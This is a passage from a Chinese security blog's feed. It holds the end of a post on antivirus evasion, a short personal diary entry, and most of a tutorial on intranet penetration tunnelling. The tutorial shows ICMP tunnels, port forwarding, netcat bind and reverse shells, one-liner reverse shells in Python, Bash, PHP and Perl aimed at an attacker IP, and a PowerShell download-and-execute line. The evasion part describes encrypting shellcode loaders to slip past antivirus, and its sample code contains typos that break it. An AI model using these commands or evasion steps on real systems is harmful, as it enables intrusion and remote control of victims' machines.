class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装第三方库 pip install pycryptodome</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> b2a_hex, a2b_hex</span><br><span class="line"></span><br><span class="line">source = <span class="string">&#x27;hello-abc&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果source不足16位的倍数就用\0补足为16位</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(source.encode(<span class="string">&#x27;utf-8&#x27;</span>)) % <span class="number">16</span>:</span><br><span class="line">add = <span class="number">16</span> - (<span class="built_in">len</span>(source.encode(<span class="string">&#x27;utf-8&#x27;</span>)) % <span class="number">16</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">add = <span class="number">0</span></span><br><span class="line">source = source + (<span class="string">&#x27;\0&#x27;</span> * add)</span><br><span class="line"><span class="built_in">print</span>(source)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义密钥和偏移量，必须是16个字节、24个字节或32个字节</span></span><br><span class="line"><span class="comment"># key = &#x27;todayiswonderful-1234567&#x27;.encode()</span></span><br><span class="line">key = <span class="string">&#x27;todayiswonderful-FEDCBA987654321&#x27;</span>.encode()</span><br><span class="line">mode = AES.MODE_CBC</span><br><span class="line">iv = <span class="string">b&#x27;1234567890ABCDEF&#x27;</span></span><br><span class="line">cryptos = AES.new(key,mode,iv)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 进行加密处理</span></span><br><span class="line">cipher = cryptos.encrytpt(source.encode())</span><br><span class="line"><span class="built_in">print</span>(cipher)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 便于传播可以将其转换成16进制，结果为db86ba246ebdf73c8a3a8b26a98ecadf</span></span><br><span class="line"><span class="built_in">print</span>(b2a_hex(cipher).encode)</span><br></pre></td></tr></table></figure></li></ol><p>解密过程与加密过程相反即可</p><h3 id="加密加载器"><a href="#加密加载器" class="headerlink" title="加密加载器"></a>加密加载器</h3><ol><li><p>将加载器代码进行base64编码</p></li><li><p>将base64编码进行AES加密</p></li></ol><h3 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h3><p>将加密后的shellcode和加载器放在同一个python文件里。<br>然后使用 <code>exec()</code> 函数执行加载器代码。</p><p>最后使用 <code>pyinstaller.exe</code> 将python文件打包为exe文件，执行命令为：<br><code>pythoninstaller.exe -Fw shellcode_run.py</code></p><p>注意：不能将变量命名为诸如shellcode, trojan, virus等敏感字词。以免被杀毒软件查杀。</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://www.wangan.com/p/7fy7f690c41538bf">免杀技术有一套</a><br><a href="https://bbs.huaweicloud.com/blogs/396696">免杀基础原理及实践免杀</a><br><a href="https://github.com/TideSec/BypassAntiVirus">远控免杀专题</a><br><a href="https://cloud.tencent.com/developer/article/2207475">MSF CS通用免杀项目</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;绝大多数用户PC上都装有杀毒软件，绕过杀毒软件顺利进入系统执行即为免杀。&lt;/p&gt;</summary>
    
    
    
    <category term="免杀" scheme="http://example.com/categories/%E5%85%8D%E6%9D%80/"/>
    
    
    <category term="免杀" scheme="http://example.com/tags/%E5%85%8D%E6%9D%80/"/>
    
  </entry>
  
  <entry>
    <title>而立</title>
    <link href="http://example.com/2023/08/30/Diary_20230830/"/>
    <id>http://example.com/2023/08/30/Diary_20230830/</id>
    <published>2023-08-29T16:00:00.000Z</published>
    <updated>2023-08-30T16:14:27.620Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>因为赶时间，就简单写写。</p><span id="more"></span><h1 id="包容度"><a href="#包容度" class="headerlink" title="包容度"></a>包容度</h1><p>大约有10天没写日记了，还是有点久了，一部分原因是我觉得没什么好写的，如果只是说几句话就算完了，有些空荡。另一部分是我懒，还记得自己说要强迫自己每天写日记，看来是没做到呢。</p><p>接下来便是我想谈的正题，由于各方面的原因，或许也可称为感悟之类的，突然在某一天，感觉自己的包容度上升了。<br>之前是怎样的呢？比如在某个地方见到有人回我评论是带有恶意的方式，我会回骂一句或直接拉黑，当然有时也只是不予理睬。<br>说这个不是想表明自己有多么嫉恶如仇，而是我常常带有一种蔑视的心理：如果某个人在某一方面的认知显得愚蠢，那么我就认为这不是值得对等交谈的人，而不屑与之相处。</p><p>但是近来，由于各种各样的原因，我渐渐能包容这些了。<br>即便有人发评论侮辱，我也能变得波澜不惊，更不会拉黑（顺带一提，我的b站黑名单已经满了）。</p><p>这么做，容易被人视为懦弱吧。</p><p>不过，这不是懦弱胆怯，这是一种包容。<br>既接受人的光辉一面，也容纳人的丑恶一面。<br>说着说着，有种“圣母”的感觉了。哈哈。</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>写得不行，没把想表达的内容写出来，有些可惜。等下次有了充裕的时间再做表述吧。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;因为赶时间，就简单写写。&lt;/p&gt;</summary>
    
    
    
    <category term="日志" scheme="http://example.com/categories/%E6%97%A5%E5%BF%97/"/>
    
    
    <category term="生活" scheme="http://example.com/tags/%E7%94%9F%E6%B4%BB/"/>
    
    <category term="日志" scheme="http://example.com/tags/%E6%97%A5%E5%BF%97/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透之隧道通信</title>
    <link href="http://example.com/2023/08/29/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E9%9A%A7%E9%81%93%E9%80%9A%E4%BF%A1/"/>
    <id>http://example.com/2023/08/29/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E9%9A%A7%E9%81%93%E9%80%9A%E4%BF%A1/</id>
    <published>2023-08-28T16:00:00.000Z</published>
    <updated>2023-08-30T08:11:50.235Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>复习+学习。</p><span id="more"></span><h1 id="隐藏通信隧道基础知识"><a href="#隐藏通信隧道基础知识" class="headerlink" title="隐藏通信隧道基础知识"></a>隐藏通信隧道基础知识</h1><h2 id="隐藏通信隧道概述"><a href="#隐藏通信隧道概述" class="headerlink" title="隐藏通信隧道概述"></a>隐藏通信隧道概述</h2><p>一般的网络通信，先在两台机器之间建立TCP连接，然后进行正常的数据通信。在知道IP地址的情况下，可以直接发送报文；如果不知道IP地址，就需要将域名解析成IP地址。在实际的网络中，通常会通过各种边界设备、软&#x2F;硬件防火墙甚至入侵检测系统来检查对外连接的情况，如果发现异常，就会对通信进行阻断。</p><p>这里的隧道，是一种绕过端口屏蔽的通信方式。防火墙两端的数据包通过防火墙所允许的数据包类型或者端口进行封装，然后穿过防火墙，与对方进行通信。当被封装的数据包到达目的地时，将数据包还原，并将还原后的数据包发送到相应的服务器上。</p><p>常用隧道列举如下：</p><ul><li>网络层：ipv6隧道、ICMP隧道、GRE隧道</li><li>传输层：TCP隧道、UDP隧道、常规端口转发</li><li>应用层：SSH隧道、HTTP隧道、HTTPS隧道、DNS隧道</li></ul><h2 id="判断内网的连通性"><a href="#判断内网的连通性" class="headerlink" title="判断内网的连通性"></a>判断内网的连通性</h2><p>判断内网的连通性是指判断机器能否上外网等。要综合判断各种协议(TCP、HTTP、DNS、ICMP等)及端口通信的情况。常见的允许流量流出的端口有80、8080、 443、53、110、123等。常用的内网连通性判断方法如下：</p><h3 id="ICMP协议"><a href="#ICMP协议" class="headerlink" title="ICMP协议"></a>ICMP协议</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">命令如下：</span><br><span class="line">ping &lt;IP地址和域名&gt;</span><br><span class="line"></span><br><span class="line">结果如下：</span><br><span class="line"></span><br><span class="line">Pinging www.xxx.com [198.18.0.106] with 32 bytes of data:</span><br><span class="line">Reply from 198.18.0.106: bytes=32 time&lt;1ms TTL=64</span><br><span class="line">Reply from 198.18.0.106: bytes=32 time&lt;1ms TTL=64</span><br><span class="line">Reply from 198.18.0.106: bytes=32 time&lt;1ms TTL=64</span><br><span class="line">Reply from 198.18.0.106: bytes=32 time&lt;1ms TTL=64</span><br><span class="line"></span><br><span class="line">Ping statistics for 198.18.0.106:</span><br><span class="line">    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),</span><br><span class="line">Approximate round trip times in milli-seconds:</span><br><span class="line">    Minimum = 0ms, Maximum = 0ms, Average = 0ms</span><br></pre></td></tr></table></figure><h3 id="TCP协议"><a href="#TCP协议" class="headerlink" title="TCP协议"></a>TCP协议</h3><p>netcat （简称nc）被誉为网络安全界的“瑞士军刀”，是一个短小精悍的工具，通过使用TCP或UDP协议的网络连接读写数据。<br>使用nc工具，执行命令：<br><code>nc &lt;IP port&gt;</code><br>开启phpstudy前后：<br><img src="/simg/tunnel_1.png" alt=" "></p><h3 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h3><p>curl是一个利用URL规则在命令行下工作的综合文件传输工具，支持文件的上传和下载。curl命令不仅支持HTTP、HTTPS、FTP等众多协议，还支持POST、Cookie、 认证、从指定偏移处下载部分文件、用户代理字符串、限速、文件大小、进度条等特征。Linux 操作系统自带curl命令。在Windows操作系统中，需要下载并安装curl 命令。</p><p><code>curl &lt;ip:port&gt;</code></p><p>如果远程主机开启了相应的端口，会输出相应的端口信息。如果远程主机没有开通相应的端口，则没有任何提示。按“Ctrl+C”键即可断开连接。</p><h3 id="DNS协议"><a href="#DNS协议" class="headerlink" title="DNS协议"></a>DNS协议</h3><p>在进行DNS连通性检测时，常用的命令为nslookup和dig。</p><p>nslookup是Windows操作系统自带的DNS探测命令，其用法如下所示。在没有指定vps-ip时，nslookup会从系统网络的TCP&#x2F;IP属性中读取DNS服务器的地址。</p><p><code>nslookup www.xxx.com vps-ip</code></p><p>dig是Linux 默认自带的DNS探测命令，其用法如下所示。<br>在没有指定vps-ip时，dig 会到 <code>/etc/resolv.conf</code> 文件中读取系统配置的DNS服务器的地址。如果vps-ip 为192.168.43.1, 将解析xxx的IP地址，说明目前DNS协议是连通的。<br><code>dig @vps-ip www.xxx.com</code></p><p>还有一种情况是流量不能直接流出，需要在内网中设置代理服务器，常见于通过企业办公网段上网的场景。常用的判断方法如下：</p><ul><li>查看网络连接，判断是否存在与其他机器的8080 (不绝对)等端口的连接(可以尝试运行 <code>ping -n 1 -a ip</code> 命令)。</li><li>查看内网中是否有主机名类似于“proxy” 的机器。</li><li>查看IE浏览器的直接代理。</li><li>根据pac文件的路径(可能是本地路径，也可能是远程路径)，将其下载下来并查看。</li><li>执行如下命令，利用curl工具进行确认。<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl www.xxx.com  //不通</span><br><span class="line">curl -X proxy-ip:port www.xxx.com  //不通</span><br></pre></td></tr></table></figure></li></ul><h1 id="网络层隧道技术"><a href="#网络层隧道技术" class="headerlink" title="网络层隧道技术"></a>网络层隧道技术</h1><h2 id="IPv6隧道"><a href="#IPv6隧道" class="headerlink" title="IPv6隧道"></a>IPv6隧道</h2><h3 id="ipv6隧道技术简介"><a href="#ipv6隧道技术简介" class="headerlink" title="ipv6隧道技术简介"></a>ipv6隧道技术简介</h3><p>IPv6隧道技术是指通过IPv4隧道传送IPv6数据报文的技术。为了在IPv4中传递IPv6信息，可以将IPv4作为隧道载体，将IPv6报文整体封装在IPv4数据报文中，使IPv6报文能够穿过IPv4，到达另一个IPv6程序。</p><p>因为现阶段的边界设备、防火墙甚至入侵防御系统还无法识别IPv6的通信数据，而大多数的攻击者有时会通过恶意软件来配置允许进行IPv6通信的设备，以避开防火墙和入侵检测系统。</p><p><img src="/simg/tunnel_2.png" alt=" "></p><p>有一点需要指出：即使设备支持IPv6，也可能无法正确分析封装了IPv6 报文的IPv4数据包。配置隧道和自动隧道的主要区别是：只有在执行隧道功能的节点的IPv6地址是IPv4兼容地址时，自动隧道才是可行的。在为执行隧道功能的节点分配IP地址时，如果采用的是自动隧道方法，就不需要进行配置。</p><p>配置隧道方法则要求隧道末端节点使用其他机制来获得其IPv4地址，例如采用DHCP、人工配置或他IPv4的配置机制。</p><p>支持IPv6的隧道工具有socat、6tunnel 、nt6tunnel 等。</p><h3 id="防御IPv6隧道攻击的方法"><a href="#防御IPv6隧道攻击的方法" class="headerlink" title="防御IPv6隧道攻击的方法"></a>防御IPv6隧道攻击的方法</h3><p>针对IPv6隧道攻击，最好的防御方法是：了解IPv6的具体漏洞，结合其他协议，通过防火墙和深度防御系统过滤IPv6通信，提高主机和应用程序的安全性。</p><h2 id="ICMP隧道"><a href="#ICMP隧道" class="headerlink" title="ICMP隧道"></a>ICMP隧道</h2><p>ICMP隧道简单、实用，是一个比较特殊的协议。在一般的通信协议里，如果两台设备要进行通信，肯定需要开放端口，而在ICMP协议下就不需要。最常见的ICMP消息为ping命令的回复，攻击者可以利用命令行得到比回复更多的ICMP请求。在通常情况下，每个ping命令都有相对应的回复与请求。</p><p>在一些网络环境中，如果攻击者使用各类上层隧道(例如HTTP隧道、DNS隧道、常规正&#x2F;反向端口转发等)进行的操作都失败了，常常会通过ping命令访问远程计算机，尝试建立ICMP隧道，将TCP&#x2F;UDP数据封装到ICMP的ping数据包中，从而穿过防火墙(通常防火墙不会屏蔽ping数据包)，实现不受限制的网络访问。</p><p>常用的ICMP隧道工具有icmpsh、PingTunnel 、icmptunnel、 powershell icmp等。</p><h3 id="icmpsh"><a href="#icmpsh" class="headerlink" title="icmpsh"></a>icmpsh</h3><p>icmpsh工具使用简单，便于“携带”(跨平台),运行时不需要管理员权限。使用git clone命令下载icmpsh。<br><code>git clone https://github.com/inquisb/icmpsh.git</code></p><p>安装Python的impacket类库，以便对TCP、UDP、ICMP、IGMP、ARP、IPv4、IPv6、SMB、MSRPC、NTLM、Kerberos、WMI、LDAP等协议进行访问。<br><code>pip install impacket</code></p><p>因为icmpsh工具要代替系统本身的ping命令的应答程序，输入如下命令来关闭本地系统的ICMP应答( 如果要恢复系统应答，则设置为0)，否则Shell的运行会不稳定(表现为一直刷屏，无法进行交互输入)。<br><code>sysctl -w net.ipv4.icmp_echo_ignore_all=1</code></p><p>直接输入“.&#x2F;run.sh” 会抱错，输入如下命令运行工具：<br><code>python2 icmpsh_m.py 【kali主机地址】 【windows主机地址】 # 运行工具</code></p><p>查看kali攻击者IP地址(192.168.220.165)。然后输入如下命令。<br><code>icmpsh.exe -t 【kali主机地址】</code></p><p>在目标主机上运行以上命令后，即可在VPS中看到反弹的shell</p><h3 id="PingTunnel"><a href="#PingTunnel" class="headerlink" title="PingTunnel"></a>PingTunnel</h3><p>PingTunnel也是一款常用的ICMP隧道工具，可以跨平台使用。为了避免隧道被滥用，可以为隧道设置密码。</p><p>实验环境：</p><ul><li>kali攻击机：192.168.220.165</li><li>web服务器(ubuntu)：192.168.220.145、192.168.52.132</li><li>内网主机(windows7)：192.168.52.133</li></ul><p>首先，在需要建立ICMP隧道的两台机器(kali和Web服务器)上安装PingTunnel工具。 然后，输入如下命令，解压压缩文件，进行配置和编译。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget http://www.cs.uit.no/~daniels/PingTunnel/PingTunnel-0.72.tar.gz</span><br><span class="line">tar -xzvf PingTunnel-0.72.tar.gz</span><br><span class="line"><span class="built_in">cd</span> PingTunnel</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure><p>但在安装前需要安装它的运行环境</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装libpcap的依赖环境</span></span><br><span class="line">apt-get install byacc</span><br><span class="line">apt-get install flex bison</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装libpcap依赖库</span></span><br><span class="line">wget http://www.tcpdump.org/release/libpcap-1.9.0.tar.gz</span><br><span class="line">tar -xzvf libpcap-1.9.0.tar.gz</span><br><span class="line"><span class="built_in">cd</span> libpcap-1.9.0</span><br><span class="line">./configure</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure><p>使用方法：<br>在Web服务器192.168.220.145中输入如下命令，运行PingTunnel 工具,开启隧道。<br><code>ptunnel -x password</code></p><p>在kali机器192.168.220.165中执行如下命令。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ptunnel -p 192.168.220.145 -lp 2333 -da 192.168.52.133 -dp 80 -x password</span><br><span class="line"></span><br><span class="line">-p   <span class="comment"># 指定ICMP隧道另一端的IP</span></span><br><span class="line">-lp  <span class="comment"># 指定本地监听的TCP端口</span></span><br><span class="line">-da  <span class="comment"># 指定要转发的目标机器的IP</span></span><br><span class="line">-dp  <span class="comment"># 指定要转发的目标机器的TCP端口</span></span><br><span class="line">-x   <span class="comment"># 指定连接密码</span></span><br></pre></td></tr></table></figure><p>上述命令的含义是：<br>在访问攻击者kali(192.168.220.165)的2333端口时，会把数据库服务器192.168.52.133的80端口的数据封装在ICMP隧道里，以Web服务器192.168.220.145为ICMP隧道跳板进行传送。</p><p><img src="/simg/tunnel_3.png" alt=" "></p><p>可以看到服务标识是windows7<br>如果内网机器是linux的可以连接22端口，如果是windows可以尝试3389端口</p><p><code>ptunnel -p 192.168.200.34 -lp 2333 -da 192.168.100.7 -dp 22 -x password</code></p><h3 id="防御ICMP隧道攻击的方法"><a href="#防御ICMP隧道攻击的方法" class="headerlink" title="防御ICMP隧道攻击的方法"></a>防御ICMP隧道攻击的方法</h3><p>许多网络管理员会阻止ICMP通信进入站点。但是在出站方向，ICMP通信是被允许的，而且目前大多数的网络和边界设备不会过滤ICMP流量。使用ICMP隧道时会产生大量的ICMP数据包，我们可以通过Wireshark进行ICMP数据包分析，以检测恶意ICMP流量，具体方法如下。</p><ul><li>检测同一来源的ICMP数据包的数量。一个正常的ping命令每秒最多发送两个数据包，而使用ICMP隧道的浏览器会在很短的时间内产生上千个ICMP数据包。</li><li>注意那些Payload大于64bit的ICMP数据包。</li><li>寻找响应数据包中的Payload与请求数据包中的Payload不一致的ICMP数据包。</li><li>检查ICMP数据包的协议标签。例如，icmptunnel 会在所有的ICMP Payload 前面添加“TUNL”标记来标识隧道一这就是特征。</li></ul><h1 id="传输层隧道技术"><a href="#传输层隧道技术" class="headerlink" title="传输层隧道技术"></a>传输层隧道技术</h1><p>传输层技术包括TCP隧道、UDP隧道和常规端口转发等。</p><h2 id="LCX端口转发"><a href="#LCX端口转发" class="headerlink" title="LCX端口转发"></a>LCX端口转发</h2><p>lcx是一个基于Socket套接字实现的端口转发工具，有Windows和Linux两个版本。Windows版为lcx.exe, Linux版为portmap。一个正常的Socket隧道必须具备两端：一端为服务端，监听一个端口，等待客户端的连接；另一端为客户端；通过传入服务端的IP地址和端口，才能主动与服务器连接。</p><p><a href="https://github.com/Brucetg/Pentest-tools/tree/master/">下载地址</a></p><h3 id="内网端口转发"><a href="#内网端口转发" class="headerlink" title="内网端口转发"></a>内网端口转发</h3><p>在目标机器上执行如下命令，将目标机器3389端口的所有数据转发到公网VPS的4444端口上。<br><code>lcx.exe -slave &lt;公网主机IP地址&gt; 4444 127.0.0.1 3389</code></p><p>在VPS上执行如下命令，将本机4444端口上监听的所有数据转发到本机的5555 端口上。<br><code>lcx.exe -listen 4444 5555</code></p><p>此时，用mstsc登录“&lt;公网主机IP地址&gt;:5555”，或者在VPS上用mstsc登录主机127.0.0.1的5555端口，即可访问目标服务器的3389端口。</p><h3 id="本地端口映射"><a href="#本地端口映射" class="headerlink" title="本地端口映射"></a>本地端口映射</h3><p>如果目标服务器由于防火墙的限制，部分端口(例如3389)的数据无法通过防火墙，可以将目标服务器相应端口的数据透传到防火墙允许的其他端口(例如53)。在目标主机上执行如下命令，就可以直接从远程桌面连接目标主机的53端口。<br><code>lcx -tran 53 &lt;目标主机IP地址&gt; 3389</code></p><h2 id="netcat"><a href="#netcat" class="headerlink" title="netcat"></a>netcat</h2><h3 id="简易使用"><a href="#简易使用" class="headerlink" title="简易使用"></a>简易使用</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">-d：后台模式</span><br><span class="line">-e：程序重定向</span><br><span class="line">-g&lt;网关&gt;：设置路由器跃程通信网关，最多可设置8个</span><br><span class="line">-G&lt;指向器数目&gt;：设置源路由指向器的数量，值为4的倍数</span><br><span class="line">-h：在线帮助</span><br><span class="line">-i&lt;延迟秒数&gt;：设置时间间隔，以便传送信息及扫描通信端口</span><br><span class="line">-l：使用监听模式，管理和控制传入的数据</span><br><span class="line">-n：直接使用IP地址(不通过域名服务器)</span><br><span class="line">-o&lt;输出文件&gt;：指定文件名称，把往来传输的数据转换为十六进制字节码后保存在该文件中</span><br><span class="line">-p&lt;通信端口&gt;：设置本地主机使用的通信端口</span><br><span class="line">-r：随机指定本地与远程主机的通信端口</span><br><span class="line">-s&lt;源地址&gt;：设置本地主机送出数据包的IP地址</span><br><span class="line">-u：使用UDP传输协议</span><br><span class="line">-v：详细输出</span><br><span class="line">-w&lt;超时秒数&gt;：设置等待连线的时间</span><br><span class="line">-z：将输入/输出功能关闭，只在扫描通信端口时使用</span><br></pre></td></tr></table></figure><p>Banner抓取：<br><code>nc -nv 192.168.220.165 21</code></p><p>连接远程主机<br><code>nc -nvv 192.168.220.165 80</code></p><p>端口扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -v 192.168.220.165 80   扫描指定端口</span><br><span class="line">nc -v -z 192.168.220.165 20-1024   扫描端口段（速度慢）</span><br></pre></td></tr></table></figure><p>端口监听<br><code>nc -l -p 4444   当访问该端口时会输出该信息到命令行</code></p><p>文件传输</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -l -p 4444                               接收方开启监听</span><br><span class="line">nc -vn 192.168.220.165 4444 &lt; test.txt -q 1 发送方传输test.txt</span><br></pre></td></tr></table></figure><p>简易聊天</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -l -p 4444               接收方开启监听</span><br><span class="line">nc -vn 192.168.220.165 4444 发送方</span><br></pre></td></tr></table></figure><h3 id="获取shell"><a href="#获取shell" class="headerlink" title="获取shell"></a>获取shell</h3><p>Shell分为两种，一种是正向Shell，另一种是反向Shell。 如果客户端连接服务器，客户端想要获取服务器的Shell, 就称为正向Shell；如果客户端连接服务器，服务器想要获取客户端的Shell,就称为反向Shell。反向Shell通常用在开启了防护措施的目标机器上，例如防火墙过滤、端口转发等。<br><strong>正向shell</strong><br>在目标主机中输入如下命令，监听目标主机的4444端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -1vp 4444 -e /bin/sh                     //Linux</span><br><span class="line">nc -lvp 4444 -e c:\\windows\\system32\\cmd.exe //Windows</span><br></pre></td></tr></table></figure><p>在kali攻击机输入如下命令，连接目标主机的4444端口<br><code>nc &lt;目标IP&gt; 4444</code></p><p>可以在目标主机上看到 目标IP 正在连接本机。</p><p><strong>反向shell</strong><br>kali攻击机输入如下命令，监听本地9999端口。<br><code>nc -lvp 9999</code></p><p>在目标主机中输入如下命令，连接VPS主机192.168.220.165 的9999端口。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.220.165 9999 -e /bin/sh                    //Linux</span><br><span class="line">nc 192.168.220.165 9999 -e C:\windows\system32\cmd.exe//Windows </span><br></pre></td></tr></table></figure><h3 id="在目标主机中没有nc时获取反向shell"><a href="#在目标主机中没有nc时获取反向shell" class="headerlink" title="在目标主机中没有nc时获取反向shell"></a>在目标主机中没有nc时获取反向shell</h3><p>在一般情况下，目标主机中是没有nc的。此时，可以使用其他工具和编程语言来代替nc，实现反向连接(下面的代码仅适用于目标主机为linux的情况)</p><p>(1) Python反向shell<br>在kali攻击机上执行命令，监听本地4444端口。<br><code>nc -lvp 4444</code></p><p>在目标主机上执行如下命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket. SOCK_STREAM);s.connect((&quot;192.168.220.165&quot;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure><p>(2) Bash反弹shell<br>在kali攻击机上执行命令，监听本地4444端口。<br><code>nc -lvp 4444</code></p><p>在目标主机上执行如下命令<br><code>bash -i &gt;&amp; /dev/tcp/192.168.220.165/4444 0&gt;&amp;1</code></p><p>(3) PHP反向shell<br>在kali攻击机上执行命令，监听本地4444端口。<br><code>nc -lvp 4444</code></p><p>PHP常用在Web服务器上，它是nc、Perl 和Bash的一个很好的替代品。执行如下命令，实现PHP环境下的反弹Shell<br><code>php -r &#39;$sock=fsockopen(&quot;192.168.220.165,4444);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code></p><p>(4) Perl反向shell<br>在kali攻击机上执行命令，监听本地4444端口。<br><code>nc -lvp 4444</code></p><p>如果此时目标主机使用的是Perl语言，仍然可以使用Perl来建立反向Shell。<br>在目标主机上运行如下命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e <span class="string">&#x27;use Socket;$i=&quot;192.168.220.165&quot;;$p=4444;socket(S,PF_INET,SOCK_STREAM, getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN, &quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="内网代理"><a href="#内网代理" class="headerlink" title="内网代理"></a>内网代理</h3><p>假设有三台主机A、B和C，其中B、C在内网环境中。主机A访问B，并获取了B的Shell；A不能直接访问C，可以通过B访问C。现在要获取C的shell。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">在主机A：nc -lvp 4444</span><br><span class="line">在主机C：nc -lvp 9999 -e /bin/sh</span><br><span class="line">在主机B：nc -v &lt;主机A的IP地址&gt; 4444 -c <span class="string">&quot;nc -v &lt;主机C的IP地址&gt; 9999&quot;</span></span><br></pre></td></tr></table></figure><h2 id="PowerCat"><a href="#PowerCat" class="headerlink" title="PowerCat"></a>PowerCat</h2><p>PowerCat可以说是nc的PowerShell版本。PowerCat 可以通过执行命令回到本地运行，也可以使用远程权限运行。<br><strong>下载安装PowerCat</strong><br>打开命令行环境，执行git clone命令( 确保本地主机中安装了git 环境)下载PowerCat<br>下载完成后，在终端输入<br><code>cd powercat</code><br>即可进入PowerCat的目录。在PowerShell命令行环境中，要想使用powercat.ps1脚本，必须先进行导入操作。<br><code>Import-Module .\powercat.ps1</code></p><p>如果提示未能加载指定模块，则可能是权限问题，输入下面命令修改权限<br><code>Set-ExecutionPolicy Unrestricted</code></p><p>如果没有权限，也可以直接下载远程文件进行绕过。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IEX (New-Object System.Net.Webclient).DownloadString(<span class="string">&#x27;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#x27;</span>)</span><br></pre></td></tr></table></figure><p><strong>powercat的使用</strong></p><figure class="highlight 